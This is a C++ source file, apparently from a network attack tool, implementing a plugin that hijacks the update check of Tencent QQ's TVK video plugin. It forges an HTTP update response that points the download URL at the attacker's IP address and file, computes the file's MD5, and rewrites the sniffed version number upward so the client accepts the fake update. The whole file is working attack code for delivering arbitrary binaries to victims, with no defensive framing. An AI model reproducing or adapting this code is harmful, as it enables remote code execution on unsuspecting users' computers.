
#include <windows.h>
#include "..\\Public.h"
#include "..\\attacker.h"
#include <iostream>
#include "..\\SdkVersion.h"
#include "QQTvkPlugin.h"
#include "../version.h"
#include "../HttpUtils.h"


using namespace std;





//dldir1.qq.com
int QQTvkPlugin::prepareRespData(unsigned long ulIP,string filepath,string filename) {

	int ret = 0;
	char * lpRespFormat = 
		"HTTP/1.1 200 OK\r\nContent-Type: application/x-javascript; charset=utf8\r\nContent-Length: %u\r\n"	
		"Connection: keep-alive\r\n\r\n%s";

	//char * lpRespFormat = 
	//	"HTTP/1.1 200 OK\r\nContent-Type: application/x-javascript; charset=utf8\r\nContent-Length: %u\r\nServer: QZHTTP-2.38.20\r\n"
	//	"X-Verify-Code: d142c74cff8da0b345bf94662bafc231\r\nKeep-Alive: timeout=15, max=1024\r\nX-Daa-Tunnel: hop_count=1\r\n"
	//	"Connection: keep-alive\r\n\r\n%s";

	char * lpRespContentFormat=
		"QZOutputJson={\"c_so_name\":\"%s\",\"c_so_update_ver\":\"%s\","
		"\"c_so_url\":\"http://%s/%s\",\"c_so_md5\":\"%s\",\"ret\": 0};\r\n\r\n";
 		//"\r\n\r\n"

	string szip = HttpUtils::getIPstr(ulIP) + "/" + G_USERNAME;

	ret = getUpdateFileMd5(filepath + filename, TRUE);

	char lpRespContent[MAX_RESPONSE_HEADER_SIZE];
	int iRespContentLen = sprintf_s(lpRespContent,MAX_RESPONSE_HEADER_SIZE,lpRespContentFormat,
		TVKPLUGIN_MODULE_NAME, DEFAULT_TVKPLUGIN_VERSION,szip.c_str(), filename.c_str(), m_szmd5);

	m_iRespSize = sprintf_s(m_lpResp,MAX_RESPONSE_HEADER_SIZE,lpRespFormat,iRespContentLen,lpRespContent);
	return m_filesize;
}





int QQTvkPlugin::SetSdkVersion(char * szsdkver, char * lphttphdr) {

	char sztmpver[MAX_PATH];
	lstrcpyA(sztmpver, szsdkver);
	char * szversions[8] = { 0 };
	int vercnt = SdkVersion::GetSdkVersion(sztmpver, szversions);
	int versions[8] = { 0 };
	for (int i = 0; i < vercnt; i++)
	{
		versions[i] = strtoul(szversions[i], 0, 10);
	}

	char * lphdr = strstr(lphttphdr, "\"c_so_update_ver\":\"V");
	char * lpend = lphdr;
	int len = 0;
	if (lphdr) {
		lphdr += lstrlenA("\"c_so_update_ver\":\"V");
		lpend = strstr(lphdr, "\"");
		len = lpend - lphdr;
		if (len != lstrlenA(szsdkver))
		{
			string prepversion = string(lphdr, len);
			printf("sdk version size not same,the prepared sdkversion:%s,the sniffered sdkversion:%s\r\n", prepversion.c_str(), szsdkver);
			return FALSE;
		}

		//versions[2] ++;
		versions[3] ++;

		char sznewver[256];
		int newverlen = wsprintfA(sznewver, "%u.%u.%03u.%04u", versions[0], versions[1], versions[2], versions[3]);
		printf("request version:%s,response version:%s\r\n", szsdkver, sznewver);
		memmove(lphdr, sznewver, newverlen);

		return TRUE;
	}
	return FALSE;
}